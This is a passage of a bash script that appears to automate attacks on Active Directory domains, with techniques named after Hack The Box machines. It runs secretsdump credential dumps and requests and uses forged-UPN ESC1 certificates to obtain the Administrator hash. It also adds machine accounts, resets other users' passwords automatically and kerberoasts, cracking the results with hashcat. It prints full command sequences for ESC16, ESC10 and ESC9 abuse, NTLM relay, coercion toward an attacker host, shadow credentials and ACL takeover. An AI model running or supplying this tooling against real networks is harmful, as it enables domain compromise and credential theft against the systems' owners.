    if command -v rusthound-ce &>/dev/null && [[ -n "$DUMP_USER" && -n "$DOMAIN" ]]; then
        info "★ RustHound-CE (BloodHound CE data collection)..."
        if [[ -n "$DUMP_PASS" ]]; then
            rusthound-ce -u "$DUMP_USER@$DOMAIN" -p "$DUMP_PASS" -i "$TARGET" -d "$DOMAIN" \
                --zip -o "$OUTDIR/bloodhound/rusthound/" 2>/dev/null | tee "$OUTDIR/bloodhound/rusthound_stdout.txt"
        elif [[ -n "$DUMP_HASH" ]]; then
            rusthound-ce -u "$DUMP_USER@$DOMAIN" --hashes "$DUMP_HASH" -i "$TARGET" -d "$DOMAIN" \
                --zip -o "$OUTDIR/bloodhound/rusthound/" 2>/dev/null | tee "$OUTDIR/bloodhound/rusthound_stdout.txt"
        fi
        ok "RustHound-CE → $OUTDIR/bloodhound/rusthound/"
    fi
else
    warn "No credentials for DCSync."
    impacket-secretsdump "${DOMAIN:-X}/"'@'"$TARGET" -no-pass 2>/dev/null | tee "$OUTDIR/hashes/secretsdump_noauth.txt"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 8 — ADCS + CERTIFICATES (HTB: Sizzle-style)
# ═══════════════════════════════════════════════════════════════════════════════
phase "8 — ADCS & CERTIFICATES"
get_best_cred

if command -v certipy-ad &>/dev/null && [[ -n "$DUMP_USER" && -n "$DOMAIN" ]]; then
    info "★ Certipy — AD Certificate Services enumeration (ESC1–ESC13)..."
    mkdir -p "$OUTDIR/certs"
    if [[ -n "$DUMP_PASS" ]]; then
        certipy-ad find -u "$DUMP_USER@$DOMAIN" -p "$DUMP_PASS" -dc-ip "$TARGET" \
            -vulnerable -stdout 2>/dev/null | tee "$OUTDIR/certs/certipy_vuln.txt"
        certipy-ad find -u "$DUMP_USER@$DOMAIN" -p "$DUMP_PASS" -dc-ip "$TARGET" \
            -output "$OUTDIR/certs/certipy_full" 2>/dev/null
    elif [[ -n "$DUMP_HASH" ]]; then
        certipy-ad find -u "$DUMP_USER@$DOMAIN" -hashes "$DUMP_HASH" -dc-ip "$TARGET" \
            -vulnerable -stdout 2>/dev/null | tee "$OUTDIR/certs/certipy_vuln.txt"
    fi
    VULN_TEMPLATES=$(grep -c "ESC" "$OUTDIR/certs/certipy_vuln.txt" 2>/dev/null || echo 0)
    if [[ $VULN_TEMPLATES -gt 0 ]]; then
        crit "★ VULNERABLE CERT TEMPLATES FOUND: $VULN_TEMPLATES"
        grep -A5 "ESC" "$OUTDIR/certs/certipy_vuln.txt" 2>/dev/null | grep -E "(Template Name|Enabled|ESC)" | head -30

        # ★ Auto-exploit ESC1 (UPN enrollment as Administrator — HTB: Authority, Certified, Absolute)
        ESC1_TEMPLATE=$(grep -B5 "ESC1" "$OUTDIR/certs/certipy_vuln.txt" 2>/dev/null | grep "Template Name" | head -1 | awk '{print $NF}')
        ESC1_CA=$(grep "CA Name" "$OUTDIR/certs/certipy_vuln.txt" 2>/dev/null | head -1 | awk '{print $NF}')
        if [[ -n "$ESC1_TEMPLATE" && -n "$ESC1_CA" && -n "$DUMP_PASS" ]]; then
            crit "★ ESC1: Template=$ESC1_TEMPLATE | CA=$ESC1_CA"
            info "Requesting certificate as Administrator via ESC1..."
            certipy-ad req -u "$DUMP_USER@$DOMAIN" -p "$DUMP_PASS" \
                -ca "$ESC1_CA" -template "$ESC1_TEMPLATE" \
                -upn "administrator@$DOMAIN" -dc-ip "$TARGET" \
                -out "$OUTDIR/certs/esc1_admin" 2>/dev/null | tee "$OUTDIR/certs/esc1_req.txt"
            if [[ -f "$OUTDIR/certs/esc1_admin.pfx" ]]; then
                crit "★ ESC1 certificate obtained — authenticating..."
                certipy-ad auth -pfx "$OUTDIR/certs/esc1_admin.pfx" \
                    -domain "$DOMAIN" -dc-ip "$TARGET" 2>/dev/null | tee "$OUTDIR/certs/esc1_auth.txt"
                ESC1_HASH=$(grep -oP '[Nn][Tt] hash[^:]*:\s*\K[0-9a-f]{32}' "$OUTDIR/certs/esc1_auth.txt" 2>/dev/null)
                [[ -n "$ESC1_HASH" ]] && { save_hash "ADCS_ESC1|administrator|$ESC1_HASH"; crit "★ Administrator NT hash via ESC1: $ESC1_HASH"; }
            fi
        fi

        # ★ ESC16 — CA Security Extension disabled (HTB: Fluffy technique)
        # When szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) is disabled on the CA,
        # anyone with GenericWrite on an account can modify its UPN to impersonate admin
        if grep -q "ESC16\|Security Extension is disabled\|1\.3\.6\.1\.4\.1\.311\.25\.2" \
            "$OUTDIR/certs/certipy_vuln.txt" "$OUTDIR/certs/certipy_full.json" 2>/dev/null; then
            crit "★★★ ESC16 DETECTED — CA Security Extension DISABLED!"
            crit "  Attack path: UPN manipulation via GenericWrite → request cert → impersonate admin"
            crit ""
            crit "  ESC16 Full Attack (HTB: Fluffy walkthrough):"
            crit "  Step 1: Read victim account's current UPN:"
            crit "    certipy-ad account -u $DUMP_USER@$DOMAIN -p '$DUMP_PASS' -user <TARGET_SVC_ACCOUNT> read -dc-ip $TARGET"
            crit "  Step 2: Change TARGET's UPN to 'administrator' (requires GenericWrite on TARGET):"
            crit "    certipy-ad account -u $DUMP_USER@$DOMAIN -p '$DUMP_PASS' -user <TARGET_SVC_ACCOUNT> -upn administrator -dc-ip $TARGET update"
            crit "  Step 3: Request certificate as TARGET (CA issues it without SID ext due to ESC16):"
            crit "    certipy-ad req -u <TARGET_SVC_ACCOUNT>@$DOMAIN -p '<TARGET_PASS>' -ca $CA_NAME -template User -dc-ip $TARGET"
            crit "  Step 4: Revert UPN BEFORE authenticating:"
            crit "    certipy-ad account -u $DUMP_USER@$DOMAIN -p '$DUMP_PASS' -user <TARGET_SVC_ACCOUNT> -upn <TARGET_SVC_ACCOUNT>@$DOMAIN update"
            crit "  Step 5: Authenticate with the certificate as administrator:"
            crit "    certipy-ad auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $TARGET"
            # Auto-attempt ESC16 if we know CA name and have a target service account
            CA_NAME=$(grep "CA Name" "$OUTDIR/certs/certipy_vuln.txt" 2>/dev/null | head -1 | sed 's/.*CA Name.*: //')
            # Try to find a service account with GenericWrite (look for ADCS-related accounts)
            ADCS_SVC=$(grep -oP 'sAMAccountName: \K\S+' "$OUTDIR/ldap/users.txt" 2>/dev/null | \
                grep -iE "ca_svc|cert|adcs|pki" | head -1)
            [[ -n "$CA_NAME" ]] && crit "  CA detected: $CA_NAME"
            [[ -n "$ADCS_SVC" ]] && crit "  Possible ADCS service account: $ADCS_SVC"
        fi

        # ★ ESC10 — Weak Certificate Mapping for Schannel (HTB: Mirage technique)
        # Requires: CertificateMappingMethods & 0x4 in Schannel registry AND UPN write access on account
        # Detection requires WinRM/shell access — add guidance
        crit "★ ESC10 Check (Schannel UPN mapping — HTB: Mirage technique):"
        warn "  ESC10 requires checking registry from a WinRM shell:"
        warn "  Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL'"
        warn "  Look for CertificateMappingMethods containing bit 0x4 (e.g., values 4, 12, 28, 31)"
        warn "  If vulnerable + you have UPN write on an account:"
        warn "  Step 1: certipy-ad account -u $DUMP_USER@$DOMAIN -p '$DUMP_PASS' -user <VICTIM> -upn 'dc01\$@$DOMAIN' update -dc-ip $TARGET"
        warn "  Step 2: certipy-ad req -u <VICTIM>@$DOMAIN -p '<VICTIM_PASS>' -ca <CA> -template User -dc-ip $TARGET"
        warn "  Step 3: Revert UPN: certipy-ad account ... -upn <VICTIM>@$DOMAIN update"
        warn "  Step 4: certipy-ad auth -pfx <VICTIM>.pfx -domain $DOMAIN -dc-ip $TARGET (authenticates as DC machine account!)"
        warn "  Step 5: Use DC\$ cert to set RBCD: certipy-ad auth -pfx dc.pfx -ldap-shell -dc-ip $TARGET"
        warn "          In ldap shell: set_rbcd $DC_HOST\$ $DUMP_USER"
        warn "  Step 6: impacket-getST -spn 'cifs/$DC_HOST.$DOMAIN' -impersonate Administrator '$DOMAIN/$DUMP_USER:$DUMP_PASS'"
        warn "          export KRB5CCNAME=Administrator.ccache && impacket-secretsdump -k $DC_HOST.$DOMAIN"
        ESC9_TEMPLATE=$(grep -B5 "ESC9" "$OUTDIR/certs/certipy_vuln.txt" 2>/dev/null | grep "Template Name" | head -1 | awk '{print $NF}')
        if [[ -n "$ESC9_TEMPLATE" ]]; then
            crit "★ ESC9 template: $ESC9_TEMPLATE"
            warn "ESC9 attack (requires GenericAll/GenericWrite on a user account):"
            warn "  1. certipy-ad account update -u $DUMP_USER@$DOMAIN -p PASS -user <TARGET> -upn administrator@$DOMAIN -dc-ip $TARGET"
            warn "  2. certipy-ad req -u <TARGET>@$DOMAIN -p PASS -ca <CA> -template $ESC9_TEMPLATE -out admin_cert"
            warn "  3. Restore UPN: certipy-ad account update ... -upn <TARGET>@$DOMAIN"
            warn "  4. certipy-ad auth -pfx admin_cert.pfx -domain $DOMAIN -dc-ip $TARGET"
        fi
    fi

    # ★ MachineAccountQuota → addcomputer → ADCS enrollment (HTB: Authority technique)
    MAQ_VAL=$(grep "ms-DS-MachineAccountQuota:" "$OUTDIR/ldap/rootdse.txt" "$OUTDIR/ldap/users.txt" 2>/dev/null | head -1 | awk '{print $2}')
    if [[ -z "$MAQ_VAL" ]]; then
        MAQ_VAL=$(ldapsearch -x -H "ldap://$TARGET" -b "$DOMAIN_DN" "(objectClass=domain)" \
            ms-DS-MachineAccountQuota 2>/dev/null | grep "ms-DS-MachineAccountQuota:" | awk '{print $2}')
    fi
    if [[ -n "$MAQ_VAL" && "$MAQ_VAL" != "0" && -n "$DUMP_PASS" ]]; then
        crit "★ MachineAccountQuota=$MAQ_VAL — Can add computer for ADCS attacks!"
        if command -v impacket-addcomputer &>/dev/null; then
            FAKE_COMP="CERTTEST$RANDOM"
            FAKE_PASS="Certtest123!"
            info "★ Adding computer account ${FAKE_COMP}$ for ADCS enrollment..."
            impacket-addcomputer "$DOMAIN/$DUMP_USER:$DUMP_PASS" -dc-ip "$TARGET" \
                -computer-name "${FAKE_COMP}$" -computer-pass "$FAKE_PASS" \
                2>/dev/null | tee "$OUTDIR/certs/addcomputer.txt"
            grep -q "Successfully added" "$OUTDIR/certs/addcomputer.txt" 2>/dev/null && {
                crit "★ Computer account added: ${FAKE_COMP}$ / $FAKE_PASS"
                warn "Now attempt ESC1 enrollment with the machine account:"
                warn "  certipy-ad req -u '${FAKE_COMP}\$@$DOMAIN' -p '$FAKE_PASS' -ca <CA> -template <TEMPLATE> -upn administrator@$DOMAIN -dc-ip $TARGET"
            }
        fi
    fi
else
    [[ -n "$DUMP_USER" ]] && warn "certipy-ad not installed. Install: pip install certipy-ad"
fi

# ★ Pass-the-Certificate — attempt certipy auth on any existing PFX files
if ls "$OUTDIR/certs/"*.pfx 2>/dev/null | head -1 | grep -q pfx; then
    info "★ PFX certificates found — Pass-the-Certificate (certipy auth)..."
    for pfx in "$OUTDIR/certs/"*.pfx; do
        [[ -f "$pfx" ]] || continue
        info "Authenticating with: $(basename "$pfx")"
        certipy-ad auth -pfx "$pfx" -domain "$DOMAIN" -dc-ip "$TARGET" \
            2>/dev/null | tee "${pfx%.pfx}_auth.txt"
        PFX_HASH=$(grep -oP '[Nn][Tt] hash[^:]*:\s*\K[0-9a-f]{32}' "${pfx%.pfx}_auth.txt" 2>/dev/null)
        [[ -n "$PFX_HASH" ]] && { save_hash "PFX_CERT|$(basename "$pfx")|$PFX_HASH"; crit "★ NT hash from certificate: $PFX_HASH"; }
    done
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 9 — WEB + WINRM + ADDITIONAL
# ═══════════════════════════════════════════════════════════════════════════════
phase "9 — ADDITIONAL ENUMERATION"

# Web
echo "$OPEN_PORTS" | grep -qE "(80|443|8080)" && command -v gobuster &>/dev/null && {
    info "Gobuster..."
    for p in 80 443 8080; do
        echo "$OPEN_PORTS" | grep -q "$p" && {
            PR="http"; [[ "$p" == "443" ]] && PR="https"
            gobuster dir -u "$PR://$TARGET:$p/" -w /usr/share/wordlists/dirb/common.txt -t 30 -q -o "$OUTDIR/web/gobuster_$p.txt" --no-error 2>/dev/null &
        }
    done; wait
}

# FTP anonymous
echo "$OPEN_PORTS" | grep -q "21" && {
    info "FTP anonymous check..."
    echo -e "anonymous\nanonymous\nls\nquit" | ftp -n "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/ftp_anon.txt"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 10 — COERCION & RELAY DETECTION
# ═══════════════════════════════════════════════════════════════════════════════
phase "10 — COERCION & RELAY DETECTION"

# PetitPotam check
info "PetitPotam (EfsRpcOpenFileRaw) check..."
impacket-rpcdump -target "$TARGET" 2>/dev/null | grep -q "c681d488-d850-11d0-8c52-00c04fd90f7e" && {
    crit "★ PetitPotam Vulnerable? MS-EFSR interface found!"
    warn "Coerce: python3 PetitPotam.py -u $AUTH_USER -p '$AUTH_PASS' <ATTACKER_IP> $TARGET"
}

# PrinterBug (SpoolSample) check
info "PrinterBug (MS-RPRN) check..."
impacket-rpcdump -target "$TARGET" 2>/dev/null | grep -q "12345678-1234-abcd-ef00-0123456789ab" && {
    crit "★ PrinterBug potential: Print Spooler interface found!"
    warn "Coerce: python3 printerbug.py DOMAIN/USER:PASS@$TARGET <ATTACKER_IP>"
}

# DFSCoerce check (HTB: Mist / Haze technique)
info "DFSCoerce (MS-DFSNM) check..."
impacket-rpcdump -target "$TARGET" 2>/dev/null | grep -q "4fc742e0-4a10-11cf-8273-00aa004ae673" && {
    crit "★ DFSCoerce potential: MS-DFSNM interface found!"
    warn "Coerce: python3 DFSCoerce.py -u $AUTH_USER -p '$AUTH_PASS' -d $DOMAIN <ATTACKER_IP> $TARGET"
}

# ShadowCoerce check
info "ShadowCoerce (MS-FSRVP) check..."
impacket-rpcdump -target "$TARGET" 2>/dev/null | grep -q "a8e0653c-2744-4389-a61d-7373df8b2292" && {
    crit "★ ShadowCoerce potential: MS-FSRVP interface found!"
    warn "Coerce: python3 ShadowCoerce.py -u $AUTH_USER -p '$AUTH_PASS' DOMAIN\\\\USER <ATTACKER_IP> $TARGET"
}

# WebDAV check
info "WebDAV (WebClient) check..."
netexec smb "$TARGET" -M webdav 2>/dev/null | grep -q "(+) Found" && {
    crit "★ WebDAV (WebClient) running — relay via HTTP possible!"
    warn "Use DNS poisoning + WebDAV coercion: python3 dnstool.py -u DOMAIN/USER -p PASS -r <attacker-hostname> -a add -t A -d <ATTACKER_IP> $TARGET"
}

# NTLM Relay setup guidance (if SMB signing disabled)
SMB_SIGN_STATUS=$(netexec smb "$TARGET" 2>/dev/null | grep -i "signing")
if echo "$SMB_SIGN_STATUS" | grep -qi "False\|not required\|disabled"; then
    crit "★ SMB SIGNING DISABLED — NTLM Relay attack possible!"
    warn "Relay setup:"
    warn "  # Standard relay"
    warn "  ntlmrelayx.py -tf targets.txt -smb2support"
    warn "  # Shadow credentials via LDAP relay (HTB: Mist technique)"
    warn "  ntlmrelayx.py -t ldap://$TARGET --shadow-credentials --shadow-target 'MACHINE\$' -smb2support"
    warn "  # DCSync via LDAP relay"
    warn "  ntlmrelayx.py -t ldap://$TARGET --dump-adcs --dump-laps --dump-gmsa -smb2support"
fi

# Responder suggestion
info "Relay Attack Simulation:"
echo -e "  ${YEL}responder -I eth0 -d -w -v${RST}"

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 11 — CREDENTIAL MANIPULATION & EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════════
phase "11 — CREDENTIAL MANIPULATION & ACL ABUSE"
get_best_cred

if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
    info "Available for manipulation: $DUMP_USER / $DUMP_PASS"

    # ★ Shadow Credentials via pywhisker (HTB: Absolute, Mist, Haze technique)
    sep; info "★ Shadow Credentials Attack (pywhisker)..."
    if command -v pywhisker &>/dev/null && [[ -n "$DOMAIN" ]]; then
        # List existing shadow creds first
        pywhisker -d "$DOMAIN" --dc-ip "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
            --target "$DUMP_USER" --action list 2>/dev/null | tee "$OUTDIR/misc/shadow_creds_list.txt"
        # Also check for users we have write access to (GenericWrite/GenericAll)
        info "Shadow credentials can be added to any user we have GenericWrite on..."
        warn "Manual: pywhisker -d $DOMAIN --dc-ip $TARGET -u $DUMP_USER -p '$DUMP_PASS' --target <TARGET_USER> --action add"
        warn "Then: python3 gettgtpkinit.py -cert-pfx <PFX> -pfx-pass <PASS> $DOMAIN/<TARGET_USER> <TGT.ccache>"
        warn "Then: export KRB5CCNAME=<TGT.ccache> && python3 getnthash.py -key <AS-REP-ENC-KEY> $DOMAIN/<TARGET_USER>"
    fi

    # ★ certipy shadow (cleaner shadow credential path — HTB: Certified, Haze)
    if command -v certipy-ad &>/dev/null; then
        info "★ Shadow Credentials via certipy shadow..."
        warn "Manual (requires GenericAll/GenericWrite on target user):"
        warn "  certipy-ad shadow auto -u $DUMP_USER@$DOMAIN -p '$DUMP_PASS' -account <TARGET_USER> -dc-ip $TARGET"
        warn "  # This will add shadow cred, obtain TGT, then get NT hash automatically"
    fi

    # ★ bloodyAD — ACL Abuse toolkit (HTB: Certified, Haze, Ghost technique)
    sep; info "★ bloodyAD ACL Abuse..."
    if command -v bloodyAD &>/dev/null && [[ -n "$DOMAIN" ]]; then
        # Get all ACLs this user has
        info "Checking write access (bloodyAD get writable)..."
        bloodyAD -d "$DOMAIN" --host "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
            get writable 2>/dev/null | tee "$OUTDIR/misc/bloodyadAcl.txt" | head -40
        warn "Common bloodyAD abuse commands:"
        warn "  # Change another user's password (GenericAll/ForceChangePassword):"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' set password <TARGET_USER> 'NewPass123!'"
        warn "  # Add user to group (AddMember):"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' add groupMember '<GROUP>' '$DUMP_USER'"
        warn "  # Set WriteSPN for targeted kerberoast:"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' set object <TARGET> servicePrincipalNames -v 'fake/spn.${DOMAIN}'"
        warn "  # Add RBCD for machine account takeover:"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' add rbcd 'DC\$' 'FAKE_MACHINE\$'"
        warn "  # Read gMSA password (ReadGMSAPassword):"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' get object 'GMSA_ACCT\$' --attr msDS-ManagedPassword"
    fi

    # ★ impacket ACL tools (HTB: Certified technique)
    sep; info "★ Impacket ACL tools (owneredit / dacledit)..."
    if command -v owneredit.py &>/dev/null || python3 -c "import impacket" 2>/dev/null; then
        warn "WriteOwner abuse — change object owner to yourself:"
        warn "  owneredit.py -action write -new-owner $DUMP_USER -target <OBJECT> $DOMAIN/$DUMP_USER:'$DUMP_PASS' -dc-ip $TARGET"
        warn "Then grant yourself rights with dacledit:"
        warn "  dacledit.py -action write -rights WriteMembers -principal $DUMP_USER -target <GROUP> $DOMAIN/$DUMP_USER:'$DUMP_PASS' -dc-ip $TARGET"
        warn "  dacledit.py -action write -rights FullControl -principal $DUMP_USER -target <USER> $DOMAIN/$DUMP_USER:'$DUMP_PASS' -dc-ip $TARGET"
        warn "Then add yourself to the group:"
        warn "  net rpc group addmem '<GROUP>' $DUMP_USER -U $DOMAIN/$DUMP_USER%'$DUMP_PASS' -S $TARGET"
        # Or use bloodyAD if available
        command -v bloodyAD &>/dev/null && {
            warn "  # Or via bloodyAD: bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' add groupMember '<GROUP>' '$DUMP_USER'"
        }
    fi

    # 1. bloodyAD password set (existing)
    command -v bloodyAD &>/dev/null && {
        info "bloodyAD check (if permissions allow setting passwords)..."
        # Example command: bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p $DUMP_PASS set password <TARGET_USER> <NEW_PASS>
    }

    # 2. impacket-changepasswd
    command -v impacket-changepasswd &>/dev/null && {
        info "impacket-changepasswd (force reset example)..."
        # Example: impacket-changepasswd 'DOMAIN/TARGET_USER'@$TARGET -altuser $DUMP_USER -altpass $DUMP_PASS -newpass 'NewPass123!' -no-pass -reset
    }

    # 3. rpcclient setuserinfo2
    info "rpcclient setuserinfo2 (manual reset method)..."
    # Example: rpcclient -U "$DUMP_USER" $TARGET -c 'setuserinfo2 <TARGET_USER> 23 <NEW_PASS>'

    # ★ Account Operators Group Abuse (DC03/HackMyVM technique)
    # Account Operators members can reset passwords of non-admin users → find a user
    # in a high-priv group (like "Operators") that ISN'T Domain Admins and reset their password
    sep; info "★ Account Operators group check (HackMyVM DC03 technique)..."
    if [[ -n "$DOMAIN" && -n "$AUTH_USER" ]]; then
        # Check if current user is in Account Operators
        ACCT_OPS_MEMBERS=$(ldapsearch -x -H "ldap://$TARGET" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
            -b "$DOMAIN_DN" \
            "(&(objectClass=group)(cn=Account Operators))" member 2>/dev/null | \
            grep "member:" | grep -i "$DUMP_USER" )

        if [[ -n "$ACCT_OPS_MEMBERS" ]]; then
            crit "★ CURRENT USER IS IN 'Account Operators'!"
            crit "  Can reset passwords of most non-DA users!"

            # Find non-Domain-Admin users who ARE in other privileged groups
            info "Looking for high-value password reset targets (non-DA but priv group members)..."
            ldapsearch -x -H "ldap://$TARGET" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
                -b "$DOMAIN_DN" \
                "(&(objectClass=user)(memberOf:1.2.840.113556.1.4.1941:=CN=Operators,CN=Builtin,$DOMAIN_DN))" \
                sAMAccountName memberOf 2>/dev/null > "$OUTDIR/misc/acctops_targets.txt" 2>/dev/null
            ldapsearch -x -H "ldap://$TARGET" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
                -b "$DOMAIN_DN" \
                "(&(objectClass=user)(adminCount=1)(!(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,$DOMAIN_DN)))" \
                sAMAccountName 2>/dev/null >> "$OUTDIR/misc/acctops_targets.txt"

            RESET_TARGETS=$(grep "sAMAccountName:" "$OUTDIR/misc/acctops_targets.txt" 2>/dev/null | awk '{print $2}' | grep -iv "$DUMP_USER")
            if [[ -n "$RESET_TARGETS" ]]; then
                crit "★ PASSWORD RESET TARGETS via Account Operators:"
                echo "$RESET_TARGETS" | while read -r rtarget; do
                    crit "  → $rtarget (reset via rpcclient setuserinfo2)"
                done
                warn "Manual reset: rpcclient -U '$DOMAIN\\$DUMP_USER%$DUMP_PASS' $TARGET -c 'setuserinfo2 <TARGET_USER> 23 \"NewPass123!\"'"
                warn "Or via netexec: netexec smb $TARGET -u $DUMP_USER -p '$DUMP_PASS' -x 'net user <TARGET_USER> NewPass123! /domain'"
                warn "Or via bloodyAD: bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' set password <TARGET_USER> 'NewPass123!'"

                # Auto-attempt reset on first target
                FIRST_TARGET=$(echo "$RESET_TARGETS" | head -1)
                if [[ -n "$FIRST_TARGET" ]]; then
                    NEW_PASS="Enum4linux@$(date +%Y)"
                    info "Attempting password reset on: $FIRST_TARGET..."
                    rpcclient -U "$DUMP_USER%$DUMP_PASS" "$TARGET" \
                        -c "setuserinfo2 $FIRST_TARGET 23 \"$NEW_PASS\"" 2>/dev/null | tee "$OUTDIR/misc/acctops_reset.txt"
                    if grep -qi "NT_STATUS_ACCESS_DENIED\|failed" "$OUTDIR/misc/acctops_reset.txt" 2>/dev/null; then
                        warn "Direct rpcclient reset failed (common) — try via bloodyAD:"
                        command -v bloodyAD &>/dev/null && {
                            bloodyAD -d "$DOMAIN" --host "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
                                set password "$FIRST_TARGET" "$NEW_PASS" 2>/dev/null | tee -a "$OUTDIR/misc/acctops_reset.txt"
                            grep -qi "success\|password\|changed" "$OUTDIR/misc/acctops_reset.txt" 2>/dev/null && {
                                crit "★ PASSWORD RESET SUCCESS: $FIRST_TARGET → $NEW_PASS"
                                save_cred "$FIRST_TARGET" "$NEW_PASS"
                            }
                        }
                    else
                        crit "★ PASSWORD RESET SUCCESS: $FIRST_TARGET → $NEW_PASS"
                        save_cred "$FIRST_TARGET" "$NEW_PASS"
                    fi
                fi
            fi
        fi

        # Also check if ANY discovered user is in Account Operators
        if [[ -s "$USERS_FILE" ]]; then
            ldapsearch -x -H "ldap://$TARGET" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
                -b "$DOMAIN_DN" \
                "(&(objectClass=group)(cn=Account Operators))" member 2>/dev/null | \
                grep "member:" | while read -r member_dn; do
                u=$(echo "$member_dn" | grep -oP 'CN=\K[^,]+' | head -1 | tr '[:upper:]' '[:lower:]')
                [[ -n "$u" ]] && ok "Account Operators member: $u"
            done | tee "$OUTDIR/misc/account_operators_members.txt"
        fi
    fi

    # ★ targetedKerberoast.py — single-command targeted Kerberoast (HTB: Vintage, TombWatcher, Delegate)
    sep; info "★ targetedKerberoast.py — automated WriteSPN kerberoast..."
    if command -v targetedKerberoast.py &>/dev/null; then
        info "Running targetedKerberoast.py on all WriteSPN targets..."
        targetedKerberoast.py -v -d "$DOMAIN" -u "$DUMP_USER" -p "$DUMP_PASS" --dc-ip "$TARGET" \
            -o "$OUTDIR/kerberos/targeted_kerberoast_auto.txt" 2>/dev/null | \
            tee "$OUTDIR/kerberos/targeted_kerberoast_stdout.txt"
        [[ -s "$OUTDIR/kerberos/targeted_kerberoast_auto.txt" ]] && {
            crit "★ TARGETED KERBEROAST HASHES:"
            cat "$OUTDIR/kerberos/targeted_kerberoast_auto.txt"
            [[ -f "$PASSLIST" ]] && {
                hashcat -m 13100 -a 0 "$OUTDIR/kerberos/targeted_kerberoast_auto.txt" "$PASSLIST" \
                    --force --quiet 2>/dev/null
                hashcat -m 13100 "$OUTDIR/kerberos/targeted_kerberoast_auto.txt" --show 2>/dev/null | \
                    grep -oP '(?<=:)[^:]+$' | while read -r p; do crit "★ CRACKED TARGETED TGS: $p"; done
            }
        }
    else
        warn "targetedKerberoast.py not found."
        warn "Install: uv tool install git+https://github.com/ShutdownRepo/targetedKerberoast.git"
        warn "  # Fallback (bloodyAD + netexec combo):"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' set object <TARGET> servicePrincipalName -v 'http/anything'"
        warn "  netexec ldap $TARGET -u $DUMP_USER -p '$DUMP_PASS' --kerberoasting $OUTDIR/kerberos/targeted.hash"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' remove object <TARGET> servicePrincipalName -v 'http/anything'"
    fi
    # Also run netexec kerberoasting (full domain)
    command -v netexec &>/dev/null && [[ -n "$DUMP_PASS" ]] && {
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
            --kerberoasting "$OUTDIR/kerberos/nxc_kerberoast.txt" 2>/dev/null
        [[ -s "$OUTDIR/kerberos/nxc_kerberoast.txt" ]] && {
            crit "★ netexec kerberoast hashes: $OUTDIR/kerberos/nxc_kerberoast.txt"
            [[ -f "$PASSLIST" ]] && {
                hashcat -m 13100 -a 0 "$OUTDIR/kerberos/nxc_kerberoast.txt" "$PASSLIST" \
                    --force --quiet 2>/dev/null
                hashcat -m 13100 "$OUTDIR/kerberos/nxc_kerberoast.txt" --show 2>/dev/null | \
                    grep -oP '(?<=:)[^:]+$' | while read -r p; do crit "★ CRACKED TGS: $p"; done
            }
        }
    }

    # ★ Disabled Account Detection + Re-enable (HTB: Mirage, Vintage technique)
    sep; info "★ Disabled Account Analysis + logonHours fix (HTB: Mirage/Vintage)..."
    ldapsearch -x -H "ldap://$TARGET" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
        -b "$DOMAIN_DN" \
        "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" \
        sAMAccountName userAccountControl logonHours memberOf 2>/dev/null | \
        tee "$OUTDIR/misc/disabled_accounts.txt" | head -80
    DISABLED_USERS=$(grep "sAMAccountName:" "$OUTDIR/misc/disabled_accounts.txt" 2>/dev/null | \
        awk '{print $2}' | grep -iv "krbtgt\|$DUMP_USER")
    if [[ -n "$DISABLED_USERS" ]]; then
        crit "★ DISABLED USER ACCOUNTS:"
        echo "$DISABLED_USERS" | while read -r dacct; do
            crit "  → $dacct"
            # Show group memberships for pivoting value
            grep -A8 "sAMAccountName: $dacct" "$OUTDIR/misc/disabled_accounts.txt" 2>/dev/null | \
                grep "memberOf:" | head -2 | while read -r mo; do crit "    $mo"; done
        done
        warn "★ To re-enable disabled account (requires GenericAll/GenericWrite on account):"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' set object <USER> userAccountControl -v 512"
        warn "  Or: bloodyAD ... remove uac <USER> -f ACCOUNTDISABLE"
        warn ""
        warn "★ Fix empty logonHours (KDC_ERR_CLIENT_REVOKED due to no logon window):"
        warn "  # Check current logonHours:"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' get object <USER> | grep logonHours"
        warn "  # If logonHours is empty, set all 168 hours allowed:"
        warn "  bloodyAD -d $DOMAIN --host $TARGET -u $DUMP_USER -p '$DUMP_PASS' set object <USER> logonHours -v '/////////////////////////////'"
        warn "  # 28-char '/' string = all hours in all 7 days allowed"
    fi

